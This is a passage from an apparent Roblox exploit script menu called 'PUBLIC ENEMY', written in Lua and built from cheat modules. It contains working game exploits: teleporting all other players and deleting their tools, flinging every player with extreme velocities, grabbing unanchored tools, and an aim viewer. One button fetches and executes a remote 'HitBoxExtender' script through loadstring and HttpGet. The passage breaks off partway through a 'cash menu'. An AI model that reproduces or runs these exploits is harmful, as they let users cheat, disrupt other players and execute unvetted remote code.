				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("LOOP BRING ALL (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Text = "PUBLIC ENEMY LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.Roboto
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black
StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER (MONSY)", function()
	--// PUBLIC ENEMY AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black title bg
Title.Text = "PUBLIC ENEMY AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red text (off)
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR (MONSY)", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = ""
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(0,0,0)
PlayerList.Font = Enum.Font.Roboto
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(0,0,0)
WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.Roboto
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "⚠ Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "⚠ WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

addMainMenuButton("TPUNANCHORED TO PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = ""
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "PUBLIC ENEMY UNANCHORED TP"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
UsernameBox.TextColor3 = Color3.new(0,0,0)
UsernameBox.Font = Enum.Font.Roboto
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(0,0,0)
FilterLabel.Font = Enum.Font.Roboto
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(0,0,0)
FilterDropdown.Font = Enum.Font.Roboto
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(0,0,0)
TPButton.Font = Enum.Font.Roboto
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(0,0,0)
GrabButton.Font = Enum.Font.Roboto
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL (MONSY)", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = ""
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["CASH MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("KALYE ONSE (MONSY)", function()
  --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Item Name TextBox
local itemBox = Instance.new("TextBox")
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 50)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Roboto
itemBox.TextSize = 14
itemBox.Parent = frame
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 95)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
sendButton.Parent = frame
